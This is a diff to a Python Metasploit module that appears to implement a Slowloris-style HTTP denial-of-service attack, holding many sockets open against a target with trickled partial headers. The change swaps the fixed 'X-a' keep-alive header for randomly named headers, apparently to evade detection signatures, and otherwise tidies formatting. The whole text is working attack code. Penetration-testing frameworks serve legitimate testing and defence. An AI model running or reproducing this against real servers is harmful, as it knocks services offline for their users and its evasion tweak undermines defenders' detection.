@@ -4,7 +4,7 @@
 import random
 import socket
 import ssl
-import sys
+import string
 import time
 
 from metasploit import module
@@ -70,6 +70,11 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
+
+def create_random_header_name(size=8, seq=string.ascii_uppercase + string.ascii_lowercase):
+    return ''.join(random.choice(seq) for _ in range(size))
+
+
 def init_socket(host, port, use_ssl=False, rand_user_agent=True):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
@@ -89,6 +94,7 @@ def init_socket(host, port, use_ssl=False, rand_user_agent=True):
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     return s
 
+
 def run(args):
     host = args['rhost']
     port = int(args['rport'])
@@ -102,7 +108,7 @@ def run(args):
     module.log("Creating sockets...", 'info')
     for i in range(socket_count):
         try:
-            module.log("Creating socket number %s" % (i), 'debug')
+            module.log("Creating socket number %s" % i, 'debug')
             s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
         except socket.error:
             break
@@ -112,7 +118,9 @@ def run(args):
         module.log("Sending keep-alive headers... Socket count: %s" % len(list_of_sockets), 'info')
         for s in list(list_of_sockets):
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                s.send("{}: {}\r\n".format(create_random_header_name(random.randint(8, 16)),
+                                           random.randint(1, 5000)).encode("utf-8"))
+
             except socket.error:
                 list_of_sockets.remove(s)
 
@@ -125,6 +133,7 @@ def run(args):
             except socket.error:
                 break
         time.sleep(delay)
+
 
 if __name__ == "__main__":
     module.run(metadata, run)
